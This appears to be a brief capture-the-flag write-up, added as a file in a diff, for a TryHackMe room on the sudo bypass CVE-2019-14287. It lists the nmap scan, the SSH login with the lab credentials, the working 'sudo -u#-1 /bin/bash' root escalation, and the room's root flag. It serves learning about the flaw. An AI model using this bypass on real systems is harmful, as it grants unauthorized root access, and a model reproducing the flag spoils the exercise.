@@ -1,0 +1,35 @@
+TryHackMe Machine: https://tryhackme.com/room/sudovulnsbypass
+
+The aim of this machine is to introduce to uss the CVE-2019-14287 exploit so we already have the username and password to login using ssh.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------
+
+
+
+First, we start with nmap scan: sudo nmap -sC -sV -p- --min-rate 5000 (target ip).
+
+We see two tcp ssh ports open 2222, and 4444.
+
+We will login into port 2222 using ssh with this credential:tryhackme:tryhackme
+
+We do the following command: ssh tryhackme@(target ip) -p 2222
+
+We are in.
+
+
+On the target machine, if we do : sudo -l, we will notice that users cant run bash as root so we cant run bash using sudo.
+
+Here comes the exploit via CVE-2019-14287:
+
+All what we need to do is to run this command: sudo -u#-1 /bin/bash .
+
+Now, we are root.
+
+We can get the root falg from /root/root.txt .
+
+root flag: THM{l33t_s3cur1ty_bypass} .
+
+//End
+
+
